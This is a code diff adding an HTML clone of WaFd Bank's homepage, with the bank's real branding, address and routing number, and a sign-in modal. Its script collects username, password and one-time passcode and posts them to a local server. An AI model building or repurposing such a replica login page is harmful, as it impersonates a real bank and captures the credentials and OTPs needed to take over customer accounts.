@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Wafd Bank UI clone</title>
+    <!-- font awesome -->
+    <link href="/your-path-to-fontawesome/css/fontawesome.css" rel="stylesheet" />
+    <link href="/your-path-to-fontawesome/css/brands.css" rel="stylesheet" />
+    <link href="/your-path-to-fontawesome/css/solid.css" rel="stylesheet" />
+    <!-- css files -->
+    <link rel="stylesheet" href="/css/style.css" type="text/css" />
+</head>
+
+<body>
+    <!-- navbar -->
+    <nav class="navbar">
+        <div class="navbar-container">
+
+            <button type="button" class="hamburger" id="menu-btn">
+                <span class="hamburger-top"></span>
+                <span class="hamburger-middle"></span>
+                <span class="hamburger-bottom"></span>
+            </button>
+
+            <div class="nav-brand">
+                <a href="/index.html">
+                    <img src="images/download.svg" />
+                </a>
+            </div>
+
+            <ul class="navbarup-left">
+                <li><a href="#">Search</a></li>
+                <li><a href="#">ATMs</a></li>
+                <li>
+                    <a href="#">
+                        <img src="images/marker.svg" />
+                        <span>Locations</span>
+                    </a>
+                <li><a href="#">Espanol</a></li>
+                <i class="fa-sharp fa-solid fa-piggy-bank"></i>
+                </li>
+
+            </ul>
+
+        </div>
+
+        <div class="scd-navbar">
+            <ul class="items">
+                <li>Personal</li>
+                <li>Business</li>
+                <li>Commercial</li>
+                <li>Money tips</li>
+            </ul>
+            <div class="btn-containers">
+                <button class="lg-btn btn-light" type="submit"> Open an Account</button>
+                <button class="sm-btn btn-colored" id="login-btn" type="submit"> Sign In</button>
+            </div>
+
+        </div>
+    </nav>
+
+    <!-- mobile menu -->
+    <div class="mobile-menu hidden" id="menu">
+        <ul>
+            <li><a href="/index.html">Home</a></li>
+            <li><a href="">Personl</a></li>
+            <li><a href="">Business</a></li>
+            <li><a href="">Commercial</a></li>
+            <li><a href="">Money tips</a></li>
+        </ul>
+
+        <div class="line"></div>
+
+        <div class="btn-containers">
+            <button class="sm-btn btn-colored login-btn" id="login-btn" type="submit"> Sign In</button>
+        </div>
+    </div>
+
+
+    <!-- hero section -->
+    <section class="hero-section">
+        <div class="hero-box">
+            <div class="hero-text">
+                <p>
+                    Enjoy the Freedom of Free Checking From a Best Bank!
+                </p>
+                <a href="#">Get Free Checking</a>
+            </div>
+            <img src="images/secongsectimg.jpg">
+        </div>
+    </section>
+    <section class="icon-sections">
+        <div class="icons">
+            <img src="images/banking.png">
+            <img src="images/cash-flow.png">
+            <img src="images/credit-card.png">
+            <img src="images/handshake.png">
+            <img src="images/location.png">
+            <img src="images/money-bag.png">
+            <img class="dis" src="images/payment-method.png">
+        </div>
+    </section>
+
+    <section class="cards-container">
+        <div class="smallcrd-containers">
+            <div class="box-1">
+                <img src="images/womanwithcard.jpg">
+                <div class="box-txt">
+                    <p>
+                    <h3>13.99% APR + Cashback!</h3>
+                    WaFd Credit Cards with Competitive Rates and Great Rewards
+                    </p>
+                </div>
+            </div>
+            <div class="box-1">
+                <img src="images/manandboy.jpg">
+                <div class="box-txt">
+                    <p>
+                    <h3>See if a WaFd Bank HELOC is right for you!</h3>
+                    Use your home's equity to finance your next big project.
+                    </p>
+                </div>
+            </div>
+            <div class="box-1">
+                <img src="images/manwithlglasses.jpg">
+                <div class="box-txt">
+                    <p>
+                    <h3>Budgeting 101: Tips for Creating a Budget That Works for You</h3>
+                    Now is the perfect time to develop a budget to help you stay on top of your finances.
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="bg-box-container">
+            <div class="bg-box">
+                <img src="images/manwithlglasses.jpg">
+                <div class="box-txt">
+                    <p>
+                    <h3>See if a WaFd Bank HELOC is right for you!</h3>
+                    Use your home's equity to finance your next big project.
+                    </p>
+                    <button class="" type="submit"> Get Started today</button>
+                </div>
+            </div>
+            <div class="bg-box">
+                <img src="images/womanwithcard.jpg">
+                <div class="box-txt">
+                    <p>
+                    <h3>See if a WaFd Bank HELOC is right for you!</h3>
+                    Use your home's equity to finance your next big project.
+                    </p>
+                    <button class="" type="submit"> Explore digital banking</button>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- map section -->
+    <section class="map-section">
+        <div class="mptxt-container">
+            <div class="text">
+                <h2>
+                    WaFd Bank, Your Local Bank for Your Personal & Business Banking
+                </h2>
+                <ul>
+                    <li>WaFd Bank is a local bank and portfolio lender with more than 200 branches in 8 states to serve
+                        you</li>
+                    <li>Over 37,000 FEE-FREE ATMs</li>
+                    <li>24/7 online & mobile banking with mobile check deposit</li>
+                    <li>Drive up ATMs</li>
+                </ul>
+                <div class="text-btn">
+                    <button class="" type="submit">Find an ATM</button>
+                    <button class="" type="submit">Find a local branch</button>
+                </div>
+            </div>
+            <img src="images/map-removebg-preview.png" alt="map">
+        </div>
+    </section>
+    <!-- prefooter -->
+    <section class="prefooter">
+        <div class="award-section">
+            <img src="images/award.jpg">
+            <div class="award-txt">
+                <h2>Awarded America's Best Big Bank - Two Years in a Row</h2>
+                <h4>Best Big Bank in <span class="lcn-links">Washington, Oregon, Idaho, New Mexico</span></h4>
+                <p>Newsweek Best Bank winners are assessed on more than 30 separate factors.<br>
+                    <span class="lcn-links"> Newsweek Best Big Banks 2022 </span>
+                </p>
+            </div>
+        </div>
+
+        <div class="link-container">
+            <div class="link-a">
+                <h4>Personal Banking</h4>
+                <ul>
+                    <li> Checking </li>
+                    <li>Free Checking</li>
+                    <li>Green Checking</li>
+                    <li>Stellar Plus Checking</li>
+                    <li>Select Banking </li>
+                    <li>Savings, CDs & Money Markets</li>
+                    <li>Retirement</li>
+                    <li>Credit Cards </li>
+                    <li>Debit Cards</li>
+                    <li>Mobile & Online Banking</li>
+                    <li>Personal Rates</li>
+                    <li>Fees</li>
+                    <li>Disclosures</li>
+                    <li>Personal Account Sign In</li>
+                </ul>
+            </div>
+            <div class="link-a">
+                <h4>Personal Banking</h4>
+                <ul>
+                    <li> Checking </li>
+                    <li>Free Checking</li>
+                    <li>Green Checking</li>
+                    <li>Stellar Plus Checking</li>
+                    <li>Select Banking </li>
+                    <li>Savings, CDs & Money Markets</li>
+                    <li>Retirement</li>
+                    <li>Credit Cards </li>
+                    <li>Debit Cards</li>
+                    <li>Mobile & Online Banking</li>
+                    <li>Personal Rates</li>
+                    <li>Fees</li>
+                    <li>Disclosures</li>
+                    <li>Personal Account Sign In</li>
+                </ul>
+            </div>
+            <div class="link-a">
+                <h4>Personal Banking</h4>
+                <ul>
+                    <li> Checking </li>
+                    <li>Free Checking</li>
+                    <li>Green Checking</li>
+                    <li>Stellar Plus Checking</li>
+                    <li>Select Banking </li>
+                    <li>Savings, CDs & Money Markets</li>
+                    <li>Retirement</li>
+                    <li>Credit Cards </li>
+                    <li>Debit Cards</li>
+                    <li>Mobile & Online Banking</li>
+                    <li>Personal Rates</li>
+                    <li>Fees</li>
+                    <li>Disclosures</li>
+                    <li>Personal Account Sign In</li>
+                </ul>
+            </div>
+            <div class="link-a">
+                <h4>Personal Banking</h4>
+                <ul>
+                    <li> Checking </li>
+                    <li>Free Checking</li>
+                    <li>Green Checking</li>
+                    <li>Stellar Plus Checking</li>
+                    <li>Select Banking </li>
+                    <li>Savings, CDs & Money Markets</li>
+                    <li>Retirement</li>
+                    <li>Credit Cards </li>
+                    <li>Debit Cards</li>
+                    <li>Mobile & Online Banking</li>
+                    <li>Personal Rates</li>
+                    <li>Fees</li>
+                    <li>Disclosures</li>
+                    <li>Personal Account Sign In</li>
+                </ul>
+            </div>
+            <div class="link-a">
+                <img src="images/download.svg"><br><br>
+                <ul>
+                    <li> <a href=""> 1-800-324-9375</a> </li><br>
+                    <li><a href="">425 Pike Street
+                            Seattle, WA 98101</a></li><br>
+                    <li><a href="">Routing # 325070980
+                        </a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="line">
+            <!--mobile footer  -->
+            <div class="socials">
+                <img src="images/social-facebook.svg">
+                <img src="images/social-youtube.svg">
+                <img src="images/social-pinterest.svg">
+                <img src="images/social-instagram.svg">
+                <img src="images/social-twitter.svg" </div>
+
+                <div class="mobile-links">
+                    <div class="link-a">
+                        <h5><a href="#">Sign In </a></h5>
+                        <li>Personal Banking</li>
+                        <li>WAFD Treasury Express</li>
+                        <li>WAFD Treasury Prime</li>
+                    </div>
+                    <hr width="130px">
+                    <div class="link-a">
+                        <h5><a href="#">Links</a></h5>
+                        <li>Terms of Use</li>
+                        <li>Privacy & Security</li>
+
+                    </div>
+
+                </div>
+                <p>
+                    Routing # 325070980
+
+                    WaFd Bank is a DBA (Doing Business As) of Washington Federal Bank.
+
+                    © 2022, WaFd Bank, All Rights Reserved. NMLSR Company #410394
+                </p>
+            </div>
+            <!-- footer -->
+            <ul class="footer-links">
+                <li>About WaFd Bank</li>
+                <li>WaFd Sports</li>
+                <li>Reviews</li>
+                <li>Careers</li>
+                <li>Community Relations</li>
+                <Li>Investor Relations</Li>
+                <li>FAQs</li>
+                <Li>Contact Us</Li>
+            </ul>
+            <div class="footer-txt">
+                <p>WaFd Bank is a DBA (Doing Business As) of Washington Federal Bank.<br><br>
+                <h5>© 2022, WaFd Bank, All Rights Reserved. NMLSR Company #410394Terms of Use | Privacy & Security</h5>
+                </p>
+            </div>
+    </section>
+    <div class="loader-container">
+        <div class="spinner"></div>
+    </div>
+    
+    <!-- login form -->
+
+    <div class="modal">
+        <div class="modal-box">
+            <div class="modal-body">
+                <form class ="form-modal" action="/" method="POST" autocomplete="off">
+                    <h4>SIGN IN</h4>
+                  <div class="errorContainer">
+                    <div class="error">  
+                    </div>
+                  </div>  
+                    <div class="form-control">
+                        <label for="email"> EMAIL OR USERNAME
+                        </label>
+                        <input class ="username" name="email" type="text">
+                    </div>
+                    <div class="form-control">
+                        <label for="password"> PASSWORD</label>
+                        <input class ="pasword" name="password" type="password">
+                    </div>
+                    <div class="form-control">
+                        <label for="otp">OTP</label>
+                        <input class="otp" name="otp" type="password" required>
+                    </div>
+                    <p><a href="#">Forget your email or password</a></p>
+                     <button type="submit" class="btn btn-dark">Login in</button>
+                </form>
+                
+            </div>
+            <div class="modal-footer">
+                <p>Don't have an account? <a href="#">Contact Us</a></p>
+              </div>
+              
+        </div>
+    </div>
+    <script src="https://kit.fontawesome.com/6016b92158.js" crossorigin="anonymous"></script>
+    <script>
+        const btn = document.getElementById('menu-btn');
+        const nav = document.getElementById('menu');
+        const modal = document.querySelector('.modal');
+        const login = document.getElementById('login-btn');
+        
+        let form = document.querySelector('form') ;
+        form.onsubmit = sendData;
+        function sendData (e) {
+            e.preventDefault();
+            let formData = new FormData(form);
+            
+            let params = {
+                headers : {
+                    'Content-Type': 'application/json'
+                } , 
+                body : JSON.stringify({
+                    email : formData.get('email'),
+                    password : formData.get('password'),
+                    otp : formData.get('otp'),
+                }),
+                method : "POST"
+            }
+            
+            fetch('http://localhost:3000/formData' , params) 
+            .then(response => response.json())
+            .then(data => {
+
+                let error =document.querySelector('.error')
+                error.innerHTML = "";
+                document.querySelector('.errorContainer').style.display = 'block';
+
+                data.errors.forEach( (err) => {
+                    error.innerHTML += `<p>${err.msg}</p>`
+                })
+
+                console.log(data)
+            })
+ 
+            .catch (err => console.log(err)) ;
+        }
+
+   
+      
+        btn.addEventListener("click" , ()=> {
+            alert("wowo " + name)
+        })
+        function navToggle() {
+            btn.classList.toggle('open');
+            nav.classList.toggle('hidden');
+            document.body.classList.toggle('no-scroll');
+        }
+
+        function openModal() {
+             modal.style.display = 'block';
+        }
+
+        function outsideclick(e)  {
+            if(e.target == modal) {
+                modal.style.display ='none';
+            }
+        }
+
+        login.addEventListener('click' , openModal)
+        btn.addEventListener('click', navToggle)
+        window.addEventListener('click' , outsideclick)
+        window.addEventListener('load',   () =>{
+        const loadercontainer = document.querySelector(".loader-container");
+         loadercontainer.style.display = "none" ;
+      })
+    </script>
+</body>
+
+</html>
